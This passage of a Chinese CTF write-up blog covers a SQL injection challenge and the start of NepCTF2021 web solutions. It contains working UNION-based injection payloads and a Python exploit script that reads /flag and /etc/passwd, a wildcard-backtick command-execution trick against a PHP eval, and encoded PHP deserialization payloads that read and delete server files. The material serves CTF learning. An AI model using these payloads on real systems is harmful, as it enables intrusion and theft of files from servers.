variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'connect error:'</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置数据库字符集</span></span></code></pre><p>读取根目录下flag，由于ban了<code>flag</code>，转十六进制即可</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>结束了</p><p>附上小脚本，虽然没啥用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>以下是本人的碎碎念和反思，师傅们可以跳过惹</p><p>经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(</p><p>数据库里写的<code>flag.txt</code>，最后却在根目录<code>/flag</code>。尝试过十六进制<code>/flag</code>读取，可能是因为太卡了，没成功就没再试了，以为就是<code>flag.txt</code>。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333</p><p>还尝试了读取一堆无用的东西，以为和 <a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a> 一样</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>没有线索，盲猜读了个<code>start.sh</code></p><pre class="language-sh" data-language="sh"><code class="language-sh">#!&#x2F;bin&#x2F;bashrm -rf &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock.lockrm -rf &#x2F;tmp&#x2F;mysql.sockusermod -d &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; mysqlln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sockchown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysqlmysqld_safe &amp;mysql_ready() &#123;mysqladmin ping --socket&#x3D;&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock --user&#x3D;root --password&#x3D;root &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1&#125;while !(mysql_ready)doecho &quot;waiting for mysql ...&quot;sleep 3donemysql -e &quot;ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;flush privileges;&quot; -uroot -prootif [[ -f &#x2F;db.sql ]]; then    mysql -e &quot;source &#x2F;db.sql&quot; -uroot -proot    rm -f &#x2F;db.sqlfiif [[ -f &#x2F;flag.sh ]]; thensource &#x2F;flag.shfiapache2-foreground</code></pre><p>然后开始爆<code>/proc/[id]/fd/[id]</code>一去不复返了。平台弄卡也有我的一份～</p><p>甚至还读了apache配置文件等等等，实在是经验不足，还是本人太菜了2333</p><p>做个反思吧，也许哪天羞耻心爆发这段就给我删了。</p><p>写给他人明鉴，写给自己反思。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql注入的姿势&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF2021</title>
    <link href="https://err0r.top/article/Nepctf2021/"/>
    <id>https://err0r.top/article/Nepctf2021/</id>
    <published>2021-03-22T04:59:47.000Z</published>
    <updated>2021-03-30T11:45:53.216Z</updated>
    
    <content type="html"><![CDATA[<p>队伍名称：Err0r</p><a id="more"></a><p>队伍情况：</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>虽然平台八太行，但是部分题目质量很高，本菜鸡爬了，虚心学习。</p><p>本Wp侧重于思路记录，大佬们轻喷…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`cat`<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`<span class="token operator">*</span><span class="token operator">></span>a`<span class="token punctuation">;</span>访问<span class="token punctuation">.</span><span class="token operator">/</span>a</code></pre><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>非常简洁，传入两个参数然后<code>eval</code>执行，格式为</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>利用`反引号和分号;执行命令</p><p>首先看到<code>len</code>用来截断字符串<code>nep</code>，而if中<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>即长度不相等，刚开始以为需要利用整形溢出</p><blockquote><p>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p></blockquote><p>测试了一下发现不对，传入字符串视为<strong>字符串类型</strong>，并不存在整形溢出，如下</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>所以思路不对，接下来想到四字符RCE，<a href="https://blog.csdn.net/q20010619/article/details/109206728">参考文章</a>，测试了一下，问题是测试下来目录非常的杂乱</p><p>flag就在当前目录，无法准确直接cat。<strong>此脚本无效，以前的脚本直接用，仅展示</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        待续</code></pre><p>访问下v，结果仅能扫到目录</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>目录变得非常乱，于是想为何不能利用<code>*</code>直接读文件呢</p><blockquote><p>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></blockquote><p>测试如下</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>测试可行，输出一个<code>cat</code>文件，然后目录就有<code>cat</code>/<code>index.php</code>/<code>nepctf.php</code>了，然后执行<code>*&gt;a</code>，即将目录内容当作命令执行输出到文件a，cat全部文件，然后访问文件a即可</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h4><pre class="language-none"><code class="language-none">读取shell.php：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---删除waf.txt：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---读取flag：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9是不是很简单？</code></pre><p>很文艺的名字，我信了它《简单的PHP反序列化》</p><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span 